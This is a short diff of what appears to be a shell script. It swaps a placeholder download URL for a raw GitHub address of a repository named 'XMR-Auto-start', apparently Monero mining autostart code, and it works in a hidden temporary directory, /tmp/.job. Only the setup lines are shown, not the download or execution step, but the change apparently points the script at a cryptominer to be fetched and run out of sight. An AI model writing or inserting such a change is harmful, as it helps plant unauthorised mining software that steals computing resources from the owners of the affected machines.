@@ -2,7 +2,7 @@
 set -e
 
 BASE="/tmp/.job"
-URL="https://example.com/scripts"
+URL="https://raw.githubusercontent.com/M24VC/XMR-Auto-start/main"
 
 mkdir -p "$BASE"
 cd "$BASE"
